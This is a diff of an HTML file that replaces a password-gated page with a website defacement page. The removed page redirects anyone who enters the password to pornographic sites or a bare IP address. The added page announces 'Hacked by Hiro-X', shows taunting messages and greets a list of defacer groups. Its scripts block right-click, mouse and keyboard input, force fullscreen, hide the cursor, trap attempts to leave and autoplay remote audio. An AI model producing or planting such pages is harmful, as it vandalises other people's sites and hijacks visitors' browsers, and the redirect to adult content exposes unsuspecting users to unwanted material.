@@ -1,159 +1,235 @@
-<!DOCTYPE html>
-<html lang="en">
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:image" content="https://i.pinimg.com/736x/f7/29/7c/f7297c908178cb79259dff4b195a92a5.jpg">
-    <meta property="og:description" content="Hai ini adalah web yang sangat sus&#129327;">
-    <meta property="og:url" content="https://ardan.vercel.app/">
-    <title>Secret Page</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
-    <link rel="shortcut icon" href="https://i.pinimg.com/736x/17/54/a2/1754a2851a4a572b3c5c511127dcc835.jpg" type="image/x-icon" />
-    <style>
-body {
-            color: crimson;
-            font-family: sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-           background: lightblue;
-			height: 100vh;
-            margin: 0;
-        }
 
-        div {
-            text-align: center;
-        }
+<html>
 
-        input {
-            margin-bottom: 10px;
-            padding: 5px;
-            background: white;
-            padding-right: 30px;
-        }
+  <!-- Hiro-X Was Here -->
+  <!-- MBH Team -->
 
-        .password-container {
-            position: relative;
-            display: inline-block;
-        }
-
-        .password-icon {
-            position: absolute;
-            top: 15px;
-            right: 10px;
-            transform: translateY(-50%);
-            cursor: pointer;
-        }
-
-        button {
-            background-color: crimson;
-            color: white;
-            padding: 8px 15px;
-            cursor: pointer;
-        }
-
-        #result.success {
-            color: green;
-            font-weight: bold;
-        }
+  <head>
+    <title>Hacked by Hiro-X</title>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="title" content="Hacked by Hiro-X">
+    <meta property="og:description" content="Awqokwok kroco lu danz -AREDI">
+    <meta property="og:image" content="https://b.top4top.io/p_2720nz3dl1.png" />
+    <meta name="keywords" content="hacked,deface,wordpress,website,whitehat,marosblackhat,defacer,hack,mirror">
+    <meta name="robots" content="index, follow">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="language" content="English">
+    <meta name="revisit-after" content="60 days">
+    <meta name="author" content="Anonsek">
+    <meta property="og:image" content="https://b.top4top.io/p_2720nz3dl1.png">
+    <meta name="theme-color" content="#000">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
+    <style type='text/css'>
+      body,
+      a:hover {
+        cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;
+      }
     </style>
-</head>
+    <link rel="stylesheet" href="https://bit.ly/2UGCIC5">
+  </head>
+  <body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play();fs()" id="body" onload="typeWriter()">
+    <style type="text/css">
+      center {
+        font-family: Courier;
+      }
 
-<body>
-    <div>
-        <h2>Masukkan Password!</h2>
-        <div class="password-container">
-            <input type="password" id="password" placeholder="Your Password">
-            <i class="material-icons password-icon" onclick="togglePassword()">visibility</i>
-        </div>
-        <button id="submitButton" onclick="checkPassword()">Enter</button>
-        <p id="result"></p>
-        <footer style="color: #787878; position: relative; bottom: 10px; text-align: center; width: 100%;">
-            <p>v1.0.0</p>
-        </footer>
-    </div>
+      img {
+        opacity: 80%;
+      }
 
-    <script>
-        var wrongAttempts = 0;
-        var cooldownActive = false;
+      red {
+        color: red;
+      }
 
-        function checkPassword() {
-            if (cooldownActive) {
-                return;
-            }
+      #background-video {
+        height: 100vh;
+        width: 100vw;
+        object-fit: cover;
+        position: fixed;
+        left: 0;
+        right: 0;
+        top: 0;
+        bottom: 0;
+        z-index: -1;
+      }
 
-            var passwordInput = document.getElementById('password');
-            var resultElement = document.getElementById('result');
-            var submitButton = document.getElementById('submitButton');
-            var enteredPassword = passwordInput.value;
+      font {
+        text-shadow: #000 0px 0px 3px;
+        -webkit-font-smoothing: antialiased;
+      }
 
-            if (!enteredPassword) {
-                resultElement.innerText = 'Password cannot be empty. Please enter your password.';
-                return;
-            }
+      div {
+        animation: glitch 1s linear infinite;
+      }
 
-            if (enteredPassword === 'secret') {
-                var randomLinks = [
-                    'https://159.223.38.69/',
-                    'https://ruangbokep.one/',
-                    'https://www.pornhub.com/video/search?search=douyin+chinese',
-                    'https://www.pornhub.com/video/search?search=japanese+porn',
-                    // Tambahkan lebih banyak URL sesuai kebutuhan
-                ];
+      @keyframes glitch {
 
-                var randomIndex = Math.floor(Math.random() * randomLinks.length);
-                var randomLink = randomLinks[randomIndex];
-
-                resultElement.innerText = 'Password Successful';
-                resultElement.classList.add('success');
-                window.location.href = randomLink;
-            } else {
-                wrongAttempts++;
-
-                if (wrongAttempts < 10) {
-                    resultElement.innerText = 'wrong password. try again!';
-                    passwordInput.value = '';
-                } else {
-                    var waitTime = 30;
-                    resultElement.innerHTML = 'Wrong password. Please try again in <span id="countdown">' + waitTime + '</span> seconds.';
-                    passwordInput.disabled = true;
-                    submitButton.disabled = true;
-
-                    var countdown = waitTime;
-                    var countdownInterval = setInterval(function () {
-                        countdown--;
-                        document.getElementById('countdown').innerText = countdown;
-
-                        if (countdown <= 0) {
-                            clearInterval(countdownInterval);
-                            resultElement.innerHTML = '';
-                            passwordInput.disabled = false;
-                            passwordInput.value = '';
-                            submitButton.disabled = false;
-                            wrongAttempts = 0;
-                            cooldownActive = false;
-                        }
-                    }, 1000);
-
-                    cooldownActive = true;
-                }
-            }
+        2%,
+        64% {
+          transform: translate(2px, 0) skew(0deg);
         }
 
-        function togglePassword() {
-            var passwordInput = document.getElementById('password');
-            var icon = document.querySelector('.password-icon');
-
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                icon.textContent = 'visibility_off';
-            } else {
-                passwordInput.type = 'password';
-                icon.textContent = 'visibility';
-            }
+        4%,
+        60% {
+          transform: translate(-2px, 0) skew(0deg);
         }
+
+        62% {
+          transform: translate(0, 0) skew(5deg);
+        }
+      }
+
+      div:before,
+      div:after {
+        content: attr(title);
+        position: absolute;
+        left: 0;
+      }
+
+      div:before {
+        animation: glitchTop 1s linear infinite;
+        clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+        -webkit-clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+      }
+
+      @keyframes glitchTop {
+
+        2%,
+        64% {
+          transform: translate(2px, -2px);
+        }
+
+        4%,
+        60% {
+          transform: translate(-2px, 2px);
+        }
+
+        62% {
+          transform: translate(13px, -1px) skew(-13deg);
+        }
+      }
+
+      div:after {
+        animation: glitchBotom 1.5s linear infinite;
+        clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
+        -webkit-clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
+      }
+
+      @keyframes glitchBotom {
+
+        2%,
+        64% {
+          transform: translate(-2px, 0);
+        }
+
+        4%,
+        60% {
+          transform: translate(-2px, 0);
+        }
+
+        62% {
+          transform: translate(-22px, 5px) skew(21deg);
+        }
+      }
+    </style>
+    <script language="JavaScript">
+      window.onbeforeunload = confirmExit;
+
+      function confirmExit() {
+        return "are you sure ? wkwk";
+      }
+
+      function fs() {
+        var elem = document.documentElement;
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+          elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        }
+        document.getElementById("body").style.cursor = 'none';
+        document.onkeydown = function(e) {
+          return false;
+        }
+        document.addEventListener("keydown", e => {
+          if (e.key == "F11") e.preventDefault();
+        });
+      }
     </script>
-</body>
+<script id="rendered-js">
+document.addEventListener('DOMContentLoaded', function (event) {
+  // array with texts to type in typewriter
+  var dataText = ["Wh00pz ! your security get down !", "Patch it now ! before got hacked again !", "Don't worry, your files are safe.", "Remember ! We are party at your security !"];
 
-</html>
+  // type one text in the typwriter
+  // keeps calling itself until the text is finished
+  function typeWriter(text, i, fnCallback) {
+    // chekc if text isn't finished yet
+    if (i < text.length) {
+      // add next character to h1
+
+      document.getElementById("hekerabies").innerHTML = text.substring(0, i + 1);
+
+      // wait for a while and call this function again for next character
+      setTimeout(function () {
+        typeWriter(text, i + 1, fnCallback);
+      }, 150);
+    }
+    // text finished, call callback if there is a callback function
+    else if (typeof fnCallback == 'function') {
+        // call callback after timeout
+        setTimeout(fnCallback, 7000);
+      }
+  }
+  // start a typewriter animation for a text in the dataText array
+  function StartTextAnimation(i) {
+    if (typeof dataText[i] == 'undefined') {
+      setTimeout(function () {
+        StartTextAnimation(0);
+      }, 30000);
+    }
+    // check if dataText[i] exists
+    if (i < dataText[i].length) {
+      // text exists! start typewriter animation
+      typeWriter(dataText[i], 0, function () {
+        // after callback (and whole text has been animated), start next text
+        StartTextAnimation(i + 1);
+      });
+    }
+  }
+  // start the text animation
+  StartTextAnimation(0);
+});
+//# sourceURL=pen.js
+    </script>
+    <audio src="https://github.com/anonseven/heker/raw/main/v2/videoplayback.m4a" autoplay="true" id="lagu" loop=""></audio>
+    <video id="background-video" src="https://github.com/anonseven/heker/raw/main/v2/videoplayback.webm" autoplay="" loop="" muted="" style="position: fixed;object-fit: cover;" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">
+      <source src="https://github.com/anonseven/heker/raw/main/v2/videoplayback.webm" type="video/webm">
+    </video>
+    <table width="100%" height="80%">
+      <td>
+        <center>
+          <small>MBH Team</small>
+          <br>
+          <img src="https://b.top4top.io/p_2720nz3dl1.png" width="220" height="220" loading="lazy" onerror="this.style.display = 'none'">
+          <br>Hacked by <red><i>Hiro-X</i></red><br>
+          <font size="2" id="hekerabies"></font><br><br>
+          <small>
+            <font size="1" color="gray">hiro@protonmail.com</font>
+          </small>
+          </div>
+          <div class="footer-greetings">
+            <marquee>
+              <font size="2">
+                <b>Greetz</b> :
+            L4N4N9_4K1R4 - /Rayzky_ - ./meicookies - exa_gans77 - VenoRyan - MR.HAGAN_4040CR4ZY - PohonSagu - ./s3nt1n3L - DemonArmy - FarisGanss - KosameAmegai - CompuByte - B3bek_Gans - Mr.Froggy - #mrlinkerrorsystem - K4TSUY4-GH05T - Malaikat Hati - Anon7 - Batang Cyber Army - D4n - Z10N.Mp4 - Mirai7 - Anonsec Team - Sulawesi Selatan Xploiter - Makassar Cyber Team - Garuda Security - Kuningan Xploiter - Cyber Error System - Komodo Squad - L0ngsorXploit - Osaka Defacer - IN4RA
+            </marquee>
+          </div>
+      </td>
+	    </table>
